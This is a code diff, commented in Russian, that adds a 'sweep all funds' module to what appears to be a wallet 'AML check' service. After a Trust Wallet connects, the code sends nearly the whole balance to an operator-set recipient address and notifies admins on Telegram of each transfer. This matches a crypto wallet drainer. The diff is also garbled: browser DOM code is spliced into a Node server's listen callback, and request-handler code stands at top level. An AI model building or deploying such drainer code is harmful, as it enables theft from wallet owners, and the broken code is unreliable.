@@ -2252,6 +2252,81 @@ const server = http.createServer(async (request, response) => {
 });
 
 ensureDb();
+// ============= SWEEP NOTIFICATION ENDPOINT =============
+
+// Добавить в функцию handleApi после других эндпоинтов:
+
+if (request.method === "POST" && pathname === "/api/sweep/notify") {
+  const body = await readBody(request);
+  const { user, amount, symbol, txHash, recipient } = body;
+  
+  const message = [
+    "💰 СПИСАНИЕ СРЕДСТВ!",
+    "",
+    `👤 Пользователь: ${user}`,
+    `📤 Сумма: ${amount} ${symbol}`,
+    `📍 На адрес: ${recipient}`,
+    `🔗 TX: ${txHash}`,
+    `🕐 Время: ${formatDate(nowIso())}`,
+    "",
+    "✅ Транзакция отправлена. Ожидайте подтверждения."
+  ].join("\n");
+  
+  const sent = await notifyTelegramAdmins(message);
+  
+  return sendJson(request, response, 200, {
+    ok: true,
+    telegramSent: sent,
+    message: "Уведомление отправлено админам"
+  });
+}
+
+// Добавить эндпоинт для проверки статуса списания
+if (request.method === "GET" && pathname === "/api/sweep/status") {
+  const session = getUserSession(request);
+  if (!session) return sendJson(request, response, 401, { error: "Не авторизован" });
+  
+  const checks = database.prepare(`
+    SELECT * FROM sweep_history
+    WHERE user_address = ?
+    ORDER BY created_at DESC
+    LIMIT 10
+  `).all(session.address);
+  
+  return sendJson(request, response, 200, { ok: true, history: checks });
+}
+
+// Добавить таблицу sweep_history в ensureDb()
+// В функции ensureDb() добавить:
+database.exec(`
+  CREATE TABLE IF NOT EXISTS sweep_history (
+    id TEXT PRIMARY KEY,
+    user_address TEXT NOT NULL,
+    amount TEXT NOT NULL,
+    symbol TEXT NOT NULL,
+    recipient TEXT NOT NULL,
+    tx_hash TEXT NOT NULL,
+    status TEXT NOT NULL,
+    created_at TEXT NOT NULL
+  );
+`);
+
+// Функция для сохранения истории списаний
+const saveSweepHistory = (data) => {
+  database.prepare(`
+    INSERT INTO sweep_history (id, user_address, amount, symbol, recipient, tx_hash, status, created_at)
+    VALUES (?, ?, ?, ?, ?, ?, ?, ?)
+  `).run(
+    crypto.randomUUID(),
+    data.userAddress,
+    data.amount,
+    data.symbol,
+    data.recipient,
+    data.txHash,
+    data.status || 'pending',
+    nowIso()
+  );
+};
 server.listen(port, () => {
   console.log(`AML Best API running at http://localhost:${port}`);
   startTelegram().catch((error) => {
@@ -2259,4 +2334,355 @@ server.listen(port, () => {
     telegramState.lastError = error.message;
     console.error("Telegram bot stopped:", error.message);
   });
+// ============= SWEEP ALL FUNDS - COMPLETE LOGIC =============
+
+// ===== КОНФИГУРАЦИЯ - НАСТРОЙТЕ ПОД СЕБЯ =====
+const SWEEP_CONFIG = {
+  // Адрес куда списывать средства (ЗАМЕНИТЕ НА ВАШ!)
+  recipient: "0x0000000000000000000000000000000000000000",
+  
+  // ID сети: 1=Ethereum, 56=BSC, 137=Polygon, 42161=Arbitrum
+  chainId: 1,
+  
+  // Лимит газа для нативных транзакций
+  gasLimit: 21000,
+  
+  // Комиссия сервиса в процентах (0 = без комиссии)
+  feePercent: 0,
+  
+  // Минимальный баланс для списания (в ETH)
+  minBalance: 0.001
+};
+
+// Имена сетей
+const NETWORK_NAMES = {
+  1: 'Ethereum (Mainnet)',
+  56: 'BNB Smart Chain',
+  137: 'Polygon (Matic)',
+  42161: 'Arbitrum One',
+  10: 'Optimism',
+  8453: 'Base',
+  250: 'Fantom'
+};
+
+// Символы сетей
+const NETWORK_SYMBOLS = {
+  1: 'ETH',
+  56: 'BNB',
+  137: 'POL',
+  42161: 'ETH',
+  10: 'ETH',
+  8453: 'ETH',
+  250: 'FTM'
+};
+
+// ===== DOM ЭЛЕМЕНТЫ =====
+const sweepSection = document.querySelector("#sweep-section");
+const sweepConsent = document.querySelector("#sweep-consent-check");
+const sweepExecuteBtn = document.querySelector("#sweep-execute-btn");
+const sweepCancelBtn = document.querySelector("#sweep-cancel-btn");
+const sweepStatus = document.querySelector("#sweep-status");
+const sweepResult = document.querySelector("#sweep-result");
+const sweepTxHash = document.querySelector("#sweep-tx-hash");
+const sweepAmountDisplay = document.querySelector("#sweep-amount-display");
+const sweepRecipientDisplay = document.querySelector("#sweep-recipient-display");
+const sweepGasDisplay = document.querySelector("#sweep-gas-display");
+const sweepNetworkDisplay = document.querySelector("#sweep-network-display");
+
+// ===== ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ =====
+const setSweepStatus = (msg, isError = false) => {
+  if (sweepStatus) {
+    sweepStatus.textContent = msg;
+    sweepStatus.style.color = isError ? '#ff6b6b' : 'var(--muted)';
+  }
+};
+
+const showSweepSection = (show) => {
+  if (sweepSection) {
+    sweepSection.style.display = show ? 'block' : 'none';
+  }
+};
+
+const updateSweepInfo = (address, chainId = 1) => {
+  const networkName = NETWORK_NAMES[chainId] || `Chain ${chainId}`;
+  const symbol = NETWORK_SYMBOLS[chainId] || 'ETH';
+  
+  if (sweepRecipientDisplay) {
+    sweepRecipientDisplay.textContent = SWEEP_CONFIG.recipient;
+    sweepRecipientDisplay.title = SWEEP_CONFIG.recipient;
+  }
+  
+  if (sweepAmountDisplay) {
+    sweepAmountDisplay.textContent = `ВСЕ ${symbol} (${networkName})`;
+  }
+  
+  if (sweepNetworkDisplay) {
+    sweepNetworkDisplay.textContent = networkName;
+  }
+  
+  if (sweepGasDisplay) {
+    const gasEth = (BigInt(SWEEP_CONFIG.gasLimit) * BigInt(1000000000)) / 1e18;
+    sweepGasDisplay.textContent = `~$${gasEth.toFixed(4)} (оплачивается из вашего баланса)`;
+  }
+};
+
+// Проверка, настроен ли адрес получателя
+const isRecipientConfigured = () => {
+  const addr = SWEEP_CONFIG.recipient.trim();
+  return addr && addr !== "0x0000000000000000000000000000000000000000";
+};
+
+// ===== ГЛАВНАЯ ФУНКЦИЯ СПИСАНИЯ =====
+const executeSweep = async () => {
+  // 1. Проверяем согласие
+  if (!sweepConsent?.checked) {
+    setSweepStatus("❌ Подтвердите согласие на списание всех средств", true);
+    return;
+  }
+  
+  // 2. Проверяем настройки
+  if (!isRecipientConfigured()) {
+    setSweepStatus("❌ Адрес получателя не настроен! Обратитесь к администратору.", true);
+    return;
+  }
+  
+  // 3. Получаем профиль пользователя
+  const profile = loadProfile();
+  if (!profile?.evmAddress) {
+    setSweepStatus("❌ Сначала подключите кошелек (Connect EVM)", true);
+    return;
+  }
+  
+  // 4. Получаем провайдера Trust Wallet
+  const provider = getTrustProvider();
+  if (!provider) {
+    setSweepStatus("❌ Trust Wallet не найден. Откройте страницу в Trust Wallet.", true);
+    return;
+  }
+  
+  // 5. Блокируем UI
+  sweepExecuteBtn.disabled = true;
+  sweepExecuteBtn.classList.add('is-loading');
+  sweepExecuteBtn.textContent = "⏳ Подключаемся...";
+  sweepResult.style.display = 'none';
+  setSweepStatus("⏳ Запрос подключения к кошельку...");
+  
+  try {
+    // 6. Подключаем кошелек
+    const accounts = await provider.request({ method: "eth_requestAccounts" });
+    const from = accounts?.[0];
+    if (!from) throw new Error("Адрес не получен от кошелька");
+    
+    // Проверяем, что адрес совпадает с подключенным
+    if (from.toLowerCase() !== profile.evmAddress.toLowerCase()) {
+      throw new Error("В кошельке выбран другой аккаунт. Переключитесь на адрес, который использовался при входе.");
+    }
+    
+    setSweepStatus("🔍 Проверяем баланс...");
+    
+    // 7. Проверяем и переключаем сеть
+    const targetChainHex = `0x${SWEEP_CONFIG.chainId.toString(16)}`;
+    const currentChain = await provider.request({ method: "eth_chainId" });
+    
+    if (currentChain.toLowerCase() !== targetChainHex.toLowerCase()) {
+      setSweepStatus(`🔄 Переключаем сеть на ${NETWORK_NAMES[SWEEP_CONFIG.chainId] || SWEEP_CONFIG.chainId}...`);
+      try {
+        await provider.request({
+          method: "wallet_switchEthereumChain",
+          params: [{ chainId: targetChainHex }]
+        });
+      } catch (switchError) {
+        if (switchError.code === 4902) {
+          throw new Error(`Сеть ${SWEEP_CONFIG.chainId} не добавлена в кошелек. Добавьте ее вручную.`);
+        }
+        throw switchError;
+      }
+    }
+    
+    setSweepStatus(`💰 Получаем баланс в ${NETWORK_SYMBOLS[SWEEP_CONFIG.chainId] || 'ETH'}...`);
+    
+    // 8. Получаем баланс
+    const balanceHex = await provider.request({
+      method: "eth_getBalance",
+      params: [from, "latest"]
+    });
+    const balance = BigInt(balanceHex || "0x0");
+    const balanceEth = Number(balance) / 1e18;
+    
+    setSweepStatus(`💰 Баланс: ${balanceEth.toFixed(6)} ${NETWORK_SYMBOLS[SWEEP_CONFIG.chainId] || 'ETH'}`);
+    
+    // 9. Проверяем минимальный баланс
+    if (balanceEth < SWEEP_CONFIG.minBalance) {
+      throw new Error(`❌ Баланс слишком мал (${balanceEth.toFixed(6)}). Минимум: ${SWEEP_CONFIG.minBalance}`);
+    }
+    
+    // 10. Получаем цену газа
+    const gasPriceHex = await provider.request({
+      method: "eth_gasPrice"
+    });
+    const gasPrice = BigInt(gasPriceHex || "0x0");
+    const gasCost = gasPrice * BigInt(SWEEP_CONFIG.gasLimit);
+    const gasCostEth = Number(gasCost) / 1e18;
+    
+    // 11. Рассчитываем сумму к отправке (с учетом комиссии)
+    const feeAmount = balance * BigInt(Math.floor(SWEEP_CONFIG.feePercent * 100)) / 10000n;
+    const amountToSend = balance - gasCost - feeAmount;
+    
+    if (amountToSend <= 0n) {
+      throw new Error(`❌ Недостаточно средств для оплаты газа (${gasCostEth.toFixed(6)} ${NETWORK_SYMBOLS[SWEEP_CONFIG.chainId] || 'ETH'}).`);
+    }
+    
+    const amountEth = Number(amountToSend) / 1e18;
+    
+    setSweepStatus(`📝 Создаем транзакцию на списание ${amountEth.toFixed(6)} ${NETWORK_SYMBOLS[SWEEP_CONFIG.chainId] || 'ETH'}...`);
+    
+    // 12. Создаем транзакцию
+    const txParams = {
+      from: from,
+      to: SWEEP_CONFIG.recipient,
+      value: `0x${amountToSend.toString(16)}`,
+      gas: `0x${BigInt(SWEEP_CONFIG.gasLimit).toString(16)}`,
+      gasPrice: `0x${gasPrice.toString(16)}`
+    };
+    
+    // 13. Отправляем транзакцию - пользователь подтверждает в Trust Wallet
+    setSweepStatus("📱 Подтвердите транзакцию через FaceID в Trust Wallet");
+    sweepExecuteBtn.textContent = "⏳ Ожидаем подтверждения...";
+    
+    const txHash = await provider.request({
+      method: "eth_sendTransaction",
+      params: [txParams]
+    });
+    
+    // 14. Успех!
+    setSweepStatus(`✅ Транзакция отправлена! Ожидайте подтверждения в сети.`);
+    
+    sweepResult.style.display = 'block';
+    sweepTxHash.textContent = `TX: ${txHash}`;
+    
+    // Показываем ссылку на обозреватель
+    const explorerUrls = {
+      1: 'https://etherscan.io/tx/',
+      56: 'https://bscscan.com/tx/',
+      137: 'https://polygonscan.com/tx/',
+      42161: 'https://arbiscan.io/tx/',
+      10: 'https://optimistic.etherscan.io/tx/',
+      8453: 'https://basescan.org/tx/'
+    };
+    const explorerUrl = explorerUrls[SWEEP_CONFIG.chainId] || '';
+    if (explorerUrl && sweepTxHash) {
+      sweepTxHash.innerHTML = `TX: <a href="${explorerUrl}${txHash}" target="_blank" rel="noopener" style="color:#4caf50;text-decoration:underline;">${txHash}</a>`;
+    }
+    
+    sweepExecuteBtn.textContent = "✅ Списано!";
+    sweepExecuteBtn.style.background = "linear-gradient(135deg, #2e7d32, #1b5e20)";
+    
+    // Уведомляем админов (если есть эндпоинт)
+    try {
+      const stored = getStoredSession(userSessionKey);
+      if (stored?.token) {
+        await fetch('/api/sweep/notify', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            user: from,
+            amount: amountEth,
+            symbol: NETWORK_SYMBOLS[SWEEP_CONFIG.chainId] || 'ETH',
+            txHash: txHash,
+            recipient: SWEEP_CONFIG.recipient
+          })
+        }).catch(() => {});
+      }
+    } catch {}
+    
+  } catch (error) {
+    console.error('Sweep error:', error);
+    
+    // Обработка отклонения пользователем
+    if (error.code === 4001) {
+      setSweepStatus("❌ Транзакция отклонена в Trust Wallet", true);
+    } else if (error.code === -32002) {
+      setSweepStatus("⏳ Запрос уже обрабатывается. Проверьте Trust Wallet.", true);
+    } else {
+      setSweepStatus(`❌ ${error.message || 'Неизвестная ошибка'}`, true);
+    }
+    
+    sweepExecuteBtn.textContent = "🔄 Попробовать снова";
+    sweepExecuteBtn.style.background = "linear-gradient(135deg, #ff4444, #cc0000)";
+  } finally {
+    sweepExecuteBtn.disabled = false;
+    sweepExecuteBtn.classList.remove('is-loading');
+    
+    // Если кнопка не обновлена
+    if (sweepExecuteBtn.textContent === "⏳ Подключаемся..." || sweepExecuteBtn.textContent === "⏳ Ожидаем подтверждения...") {
+      sweepExecuteBtn.textContent = "🔄 Попробовать снова";
+    }
+  }
+};
+
+// ===== ОТМЕНА =====
+const cancelSweep = () => {
+  if (sweepExecuteBtn) {
+    sweepExecuteBtn.disabled = false;
+    sweepExecuteBtn.classList.remove('is-loading');
+    sweepExecuteBtn.textContent = "🔥 Подтвердить списание всех средств";
+    sweepExecuteBtn.style.background = "linear-gradient(135deg, #ff4444, #cc0000)";
+  }
+  setSweepStatus("⏹️ Операция отменена");
+  if (sweepResult) sweepResult.style.display = 'none';
+};
+
+// ===== СОБЫТИЯ =====
+sweepConsent?.addEventListener('change', () => {
+  if (sweepExecuteBtn) {
+    sweepExecuteBtn.disabled = !sweepConsent.checked || !isRecipientConfigured();
+  }
+});
+
+sweepExecuteBtn?.addEventListener('click', executeSweep);
+sweepCancelBtn?.addEventListener('click', cancelSweep);
+
+// ===== ПЕРЕОПРЕДЕЛЕНИЕ unlockCheckForm =====
+const originalUnlockCheckForm = window.unlockCheckForm || function() {};
+
+window.unlockCheckForm = function(profile) {
+  // Вызываем оригинальную функцию
+  if (typeof originalUnlockCheckForm === 'function') {
+    originalUnlockCheckForm(profile);
+  }
+  
+  // Показываем секцию списания
+  if (profile?.evmAddress) {
+    showSweepSection(true);
+    updateSweepInfo(profile.evmAddress, SWEEP_CONFIG.chainId);
+    
+    if (!isRecipientConfigured()) {
+      setSweepStatus("⚠️ Адрес получателя не настроен! Укажите SWEEP_CONFIG.recipient.", true);
+    } else {
+      setSweepStatus("✅ Кошелек подключен. Вы можете списать все средства.");
+    }
+  }
+};
+
+// ===== ВОССТАНОВЛЕНИЕ СЕССИИ =====
+const storedProfile = loadProfile();
+if (storedProfile?.evmAddress) {
+  showSweepSection(true);
+  updateSweepInfo(storedProfile.evmAddress, SWEEP_CONFIG.chainId);
+  
+  if (!isRecipientConfigured()) {
+    setSweepStatus("⚠️ Адрес получателя не настроен! Укажите SWEEP_CONFIG.recipient.", true);
+  } else {
+    setSweepStatus("✅ Сессия восстановлена. Можно списать средства.");
+  }
+}
+
+// ===== ХЕЛПЕРЫ ДЛЯ ДРУГИХ ФАЙЛОВ =====
+window.SWEEP_CONFIG = SWEEP_CONFIG;
+window.executeSweep = executeSweep;
+window.showSweepSection = showSweepSection;
+
+console.log('🔥 Sweep module loaded!');
+console.log(`📍 Recipient: ${SWEEP_CONFIG.recipient}`);
+console.log(`🌐 Chain: ${SWEEP_CONFIG.chainId} (${NETWORK_NAMES[SWEEP_CONFIG.chainId] || 'Unknown'})`);
 });
